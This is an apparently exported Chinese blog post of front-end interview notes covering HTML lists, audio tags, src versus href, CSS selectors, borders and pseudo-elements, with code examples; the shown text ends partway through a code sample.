{"title":"前端面试题目","uid":"4bd7150fd9e4dc678a3c2ce6062a159a","slug":"前端面试题目","date":"2022-03-31T00:42:00.000Z","updated":"2022-05-05T13:37:24.415Z","comments":true,"path":"api/articles/前端面试题目.json","keywords":null,"cover":"https://kifimg.oss-cn-beijing.aliyuncs.com/imgforhexo/202203310851324.jpg","content":"<h2 id=\"html基础\"><a href=\"#html基础\" class=\"headerlink\" title=\"html基础\"></a>html基础</h2><h3 id=\"1-自定义列表\"><a href=\"#1-自定义列表\" class=\"headerlink\" title=\"1.自定义列表\"></a>1.自定义列表</h3><pre class=\"line-numbers language-html\" data-language=\"html\"><code class=\"language-html\"><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>zh<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>UTF-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>viewport<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>width=device-width, initial-scale=1.0<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>X-UA-Compatible<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>ie=edge<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dl</span><span class=\"token punctuation\">></span></span>\n\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dt</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dt</span><span class=\"token punctuation\">></span></span>\n\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dd</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dd</span><span class=\"token punctuation\">></span></span>\n\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dd</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dd</span><span class=\"token punctuation\">></span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dl</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>1.dt中一般是你的列表的表头<br>2.dd中相当于ul的li中相同的内容<br><img src=\"https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310845722.png\" alt=\"image-20220316153307245\"></p>\n<p>自定义列表一般用于以下内容</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310845789.png\"></p>\n<h3 id=\"2-多媒体标签之音频标签\"><a href=\"#2-多媒体标签之音频标签\" class=\"headerlink\" title=\"2.多媒体标签之音频标签\"></a>2.多媒体标签之音频标签</h3><p>音频标签以<audio>为代表，<audio>音频标签属性如下：<br>autoplay&#x3D;”autoplay” 打开页面后，音频会自动播放<br>controls&#x3D;”controls” 在页面显示控件，比如播放按钮<br>loop&#x3D;”loop” 循环播放当前音频<br>src&#x3D;”url” 导入音频文件地址(url是文件地址的统称举例)<br>注意：<br>1.谷歌浏览器把autoplay(自动播放)属性给禁用了，所以在谷歌浏览器中没法实现音频自动播放。<br>2.因为不同浏览器的支持格式不同，我们采取的解决方案是为一个音频准备多个如格式的文件，举例如下：</p>\n<pre class=\"line-numbers language-html\" data-language=\"html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>audio</span> <span class=\"token attr-name\">controls</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>controls<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>source</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>E:\\HTML+CSS\\案例\\media\\案例1.mp3<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>audio/mpeg<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>source</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>E:\\HTML+CSS\\案例\\media\\案例1.ogg<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>audio/ogg<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n            您的浏览器需要升级，目前不支持audio播放\n <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>audio</span><span class=\"token punctuation\">></span></span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"3-onerror-事件\"><a href=\"#3-onerror-事件\" class=\"headerlink\" title=\"3.onerror 事件\"></a>3.onerror 事件</h3><p>onerror 事件在视频&#x2F;音频（audio&#x2F;video）数据加载期间发生错误时触发。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;video onerror&#x3D;&quot;myFunction()&quot;&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n\n\n<h3 id=\"4、为什么link用href获取资源-script和img用src\"><a href=\"#4、为什么link用href获取资源-script和img用src\" class=\"headerlink\" title=\"4、为什么link用href获取资源 script和img用src\"></a>4、为什么link用href获取资源 script和img用src</h3><p><strong>参考答案：</strong></p>\n<p>src用于替换当前元素，href用于在当前文档和引用资源之间确立联系。</p>\n<p>src</p>\n<ul>\n<li><p>src是source的缩写，指向外部资源的位置，指向的内容将会嵌入到文档中当前标签所在位置；在请求src资源时会将其指向的资源下载并应用到文档内，例如js脚本，img图片和frame等元素</p>\n<pre class=\"line-numbers language-html\" data-language=\"html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">src</span> <span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>js.js<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></li>\n</ul>\n<p> 当浏览器解析到该元素时，<strong>会暂停其他资源的下载和处理</strong>，直到将该资源加载、编译、执行完毕，图片和框架 等元素也如此，类似于将所指向资源嵌入当前标签内。<strong>这也是为什么将js脚本放在底部而不是头部</strong></p>\n<p>href</p>\n<ul>\n<li><p><code>href</code>是<code>Hypertext Reference</code>的缩写，指向网络资源所在位置，建立和当前元素（锚点）或当前文档（链接）之间的链接</p>\n</li>\n<li><p>在文档中添加<code>link</code>标签，浏览器会识别该文档为<code>css</code>文件，就会并行下载资源并且<strong>不会</strong>停止对当前文档的处理。这也是为什么建议使用<code>link</code>方式来加载<code>css</code>，而不是使用<code>@import</code>方式</p>\n<pre class=\"line-numbers language-html\" data-language=\"html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>link</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>common.css<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">rel</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>stylesheet<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">/></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></li>\n</ul>\n<h2 id=\"CSS\"><a href=\"#CSS\" class=\"headerlink\" title=\"CSS\"></a>CSS</h2><h3 id=\"1-css选择某一个-CSS-first-child-选择器-CSS选择器——伪类选择器\"><a href=\"#1-css选择某一个-CSS-first-child-选择器-CSS选择器——伪类选择器\" class=\"headerlink\" title=\"1.css选择某一个 (CSS :first-child 选择器,CSS选择器——伪类选择器)\"></a>1.css选择某一个 (CSS :first-child 选择器,<strong>CSS选择器——伪类选择器</strong>)</h3><p>q:请将html模块中ul列表的第2个li标签和第4个li标签的背景颜色设置成”rgb(255, 0, 0)”。</p>\n<pre class=\"line-numbers language-html\" data-language=\"html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>utf-8</span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/css<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\">\n            <span class=\"token comment\">/*补全代码*/</span>\n            \n        </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>ul</span><span class=\"token punctuation\">></span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span>1<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span>2<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span>3<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span>4<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>ul</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>CSS :first-child 选择器</strong>：:first-child 选择器用于选取属于其父元素的首个子元素的指定选择器。</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">ul > :first-child + li</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token property\">margin-right</span><span class=\"token punctuation\">:</span> 50px<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token selector\">ul > :first-child + li + li+ li</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token property\">margin-right</span><span class=\"token punctuation\">:</span> 50px<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"2、CSS-边框属性\"><a href=\"#2、CSS-边框属性\" class=\"headerlink\" title=\"2、CSS 边框属性\"></a>2、CSS 边框属性</h3><pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">p</span>\n  <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">border</span><span class=\"token punctuation\">:</span>5px solid red<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以按顺序设置如下属性：</p>\n<ul>\n<li>border-width</li>\n<li>border-style</li>\n<li>border-color</li>\n</ul>\n<h4 id=\"border-style可能的值\"><a href=\"#border-style可能的值\" class=\"headerlink\" title=\"border-style可能的值\"></a>border-style可能的值</h4><table>\n<thead>\n<tr>\n<th align=\"left\">值</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">none</td>\n<td align=\"left\">定义无边框。</td>\n</tr>\n<tr>\n<td align=\"left\">hidden</td>\n<td align=\"left\">与 “none” 相同。不过应用于表时除外，对于表，hidden 用于解决边框冲突。</td>\n</tr>\n<tr>\n<td align=\"left\">dotted</td>\n<td align=\"left\">定义点状边框。在大多数浏览器中呈现为实线。</td>\n</tr>\n<tr>\n<td align=\"left\">dashed</td>\n<td align=\"left\">定义虚线。在大多数浏览器中呈现为实线。</td>\n</tr>\n<tr>\n<td align=\"left\">solid</td>\n<td align=\"left\">定义实线。</td>\n</tr>\n<tr>\n<td align=\"left\">double</td>\n<td align=\"left\">定义双线。双线的宽度等于 border-width 的值。</td>\n</tr>\n<tr>\n<td align=\"left\">groove</td>\n<td align=\"left\">定义 3D 凹槽边框。其效果取决于 border-color 的值。</td>\n</tr>\n<tr>\n<td align=\"left\">ridge</td>\n<td align=\"left\">定义 3D 垄状边框。其效果取决于 border-color 的值。</td>\n</tr>\n<tr>\n<td align=\"left\">inset</td>\n<td align=\"left\">定义 3D inset 边框。其效果取决于 border-color 的值。</td>\n</tr>\n<tr>\n<td align=\"left\">outset</td>\n<td align=\"left\">定义 3D outset 边框。其效果取决于 border-color 的值。</td>\n</tr>\n<tr>\n<td align=\"left\">inherit</td>\n<td align=\"left\">规定应该从父元素继承边框样式。</td>\n</tr>\n</tbody></table>\n<p>eg:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">圣诞节来啦！请用CSS给你的朋友们制作一颗圣诞树吧~这颗圣诞树描述起来是这样的：\n1. &quot;topbranch&quot;是圣诞树的上枝叶，该上枝叶仅通过边框属性、左浮动、左外边距即可实现。边框的属性依次是：宽度为100px、是直线、颜色为green（未显示的边框颜色都为透明）\n2. &quot;middleBranch&quot;是圣诞树的中枝叶，该上枝叶仅通过边框属性即可实现。边框的属性依次是：宽度为200px、是直线、颜色为green（未显示的边框颜色都为透明）\n3. &quot;base&quot;是圣诞树的树干，该树干仅通过左外边距实现居中于中枝叶。树干的宽度、高度分别为70px、200px，颜色为gray。\n注意：\n1. 上枝叶、树干的居中都是通过左外边距实现的\n2. 没有显示的边框，其属性都是透明（属性）\n3. 仅通过border属性完成边框的所有属性设置<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310845770.png\"></p>\n<pre class=\"line-numbers language-html\" data-language=\"html\"><code class=\"language-html\"><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>utf-8</span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/css<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\">\n            <span class=\"token selector\">.topbranch</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 0px<span class=\"token punctuation\">;</span>\n                <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 0px<span class=\"token punctuation\">;</span>\n                <span class=\"token comment\">/*\n                * TODO: 上枝叶效果\n                */</span>\n               <span class=\"token property\">float</span><span class=\"token punctuation\">:</span>left<span class=\"token punctuation\">;</span>\n               <span class=\"token property\">border-bottom</span><span class=\"token punctuation\">:</span>100px solid green<span class=\"token punctuation\">;</span>\n               <span class=\"token property\">border-left</span><span class=\"token punctuation\">:</span>100px solid transparent<span class=\"token punctuation\">;</span>\n               <span class=\"token property\">border-right</span><span class=\"token punctuation\">:</span>100px solid transparent<span class=\"token punctuation\">;</span>\n               <span class=\"token property\">border-top</span><span class=\"token punctuation\">:</span>100px solid transparent<span class=\"token punctuation\">;</span>\n               <span class=\"token property\">margin-left</span><span class=\"token punctuation\">:</span>100px\n               \n                \n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token selector\">.middleBranch</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 0px<span class=\"token punctuation\">;</span>\n                <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 0px<span class=\"token punctuation\">;</span>\n                <span class=\"token comment\">/*\n                * TODO: 中枝叶效果\n                */</span>\n                <span class=\"token property\">border-bottom</span><span class=\"token punctuation\">:</span>200px solid green<span class=\"token punctuation\">;</span>\n                <span class=\"token property\">border-left</span><span class=\"token punctuation\">:</span>200px solid transparent<span class=\"token punctuation\">;</span>\n                 <span class=\"token property\">border-top</span><span class=\"token punctuation\">:</span>200px solid transparent<span class=\"token punctuation\">;</span>\n                 <span class=\"token property\">border-right</span><span class=\"token punctuation\">:</span>200px solid transparent<span class=\"token punctuation\">;</span>\n                \n                \n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token selector\">.base</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token comment\">/*\n                * TODO: 树干效果\n                */</span>\n                <span class=\"token property\">width</span><span class=\"token punctuation\">:</span>70px<span class=\"token punctuation\">;</span>\n                <span class=\"token property\">height</span><span class=\"token punctuation\">:</span>200px<span class=\"token punctuation\">;</span>\n                <span class=\"token property\">background-color</span><span class=\"token punctuation\">:</span>gray<span class=\"token punctuation\">;</span>\n                <span class=\"token property\">float</span><span class=\"token punctuation\">:</span>left<span class=\"token punctuation\">;</span>\n                <span class=\"token property\">margin-left</span><span class=\"token punctuation\">:</span>165px\n                \n            <span class=\"token punctuation\">&#125;</span>\n        </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n    \t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>section</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>topbranch<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>section</span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>section</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>middleBranch<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>section</span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>section</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>base<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>section</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"3、-CSS选择器——伪元素\"><a href=\"#3、-CSS选择器——伪元素\" class=\"headerlink\" title=\"3、 CSS选择器——伪元素\"></a>3、 <strong>CSS选择器——伪元素</strong></h3><p>伪元素是一个附加在选择器末尾的关键词，通过伪元素您不需要借助元素的 ID 或 class 属性就可以对被选择元素的特定部分定义样式。例如通过伪元素您可以设置段落中第一个字母的样式，或者在元素之前、之后插入一些内容等等。</p>\n<p>在 CSS1 和 CSS2 中，伪元素的使用与伪类相同，都是使一个冒号<code>:</code>与选择器相连。但在 CSS3 中，将伪元素单冒号的使用方法改为了使用双冒号<code>::</code>，以此来区分伪类和伪元素。因此，建议在使用伪元素时使用双冒号而不是单冒号。</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">selector::pseudo-element</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">property</span><span class=\"token punctuation\">:</span> value<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>其中，selector 为选择器，pseudo-element 为伪元素的名称，property 为 CSS 中的属性，value 为属性对应的值。</p>\n<p>CSS 中提供了一系列的伪元素，如下表所示：</p>\n<table>\n<thead>\n<tr>\n<th>伪元素</th>\n<th>例子</th>\n<th>例子描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>::after</td>\n<td>p::after</td>\n<td>在每个 <p> 元素之后插入内容</td>\n</tr>\n<tr>\n<td>::before</td>\n<td>p::before</td>\n<td>在每个 <p> 元素之前插入内容</td>\n</tr>\n<tr>\n<td>::first-letter</td>\n<td>p::first-letter</td>\n<td>匹配每个 <p> 元素中内容的首字母</td>\n</tr>\n<tr>\n<td>::first-line</td>\n<td>p::first-line</td>\n<td>匹配每个 <p> 元素中内容的首行</td>\n</tr>\n<tr>\n<td>::selection</td>\n<td>p::selection</td>\n<td>匹配用户选择的元素部分</td>\n</tr>\n<tr>\n<td>::placeholder</td>\n<td>input::placeholder</td>\n<td>匹配每个表单输入框（例如 <input>）的 placeholder 属性</td>\n</tr>\n</tbody></table>\n<h4 id=\"1-after\"><a href=\"#1-after\" class=\"headerlink\" title=\"1. ::after\"></a>1. ::after</h4><p>伪元素 ::after 能够在指定元素的后面插入一些内容，在 ::after 中需要使用 content 属性来定义要追加的内容，而且在 ::after 中必须定义 content 属性才会生效（没有需要插入的内容时可以将 content 属性的值定义为空<code>&quot;&quot;</code>）。</p>\n<pre class=\"line-numbers language-html\" data-language=\"html\"><code class=\"language-html\"><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\">\n        <span class=\"token selector\">p.one::after</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token property\">content</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token property\">display</span><span class=\"token punctuation\">:</span> inline-block<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 50px<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 10px<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">background</span><span class=\"token punctuation\">:</span> blue<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token selector\">p.two::after</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token property\">content</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"要插入的内容\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token property\">color</span><span class=\"token punctuation\">:</span> red<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">font-size</span><span class=\"token punctuation\">:</span> 6px<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token selector\">p.three::after</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token property\">content</span><span class=\"token punctuation\">:</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span><span class=\"token string url\">'./smiley.gif'</span><span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">;</span>\n            <span class=\"token property\">position</span><span class=\"token punctuation\">:</span> relative<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">top</span><span class=\"token punctuation\">:</span> 8px<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token 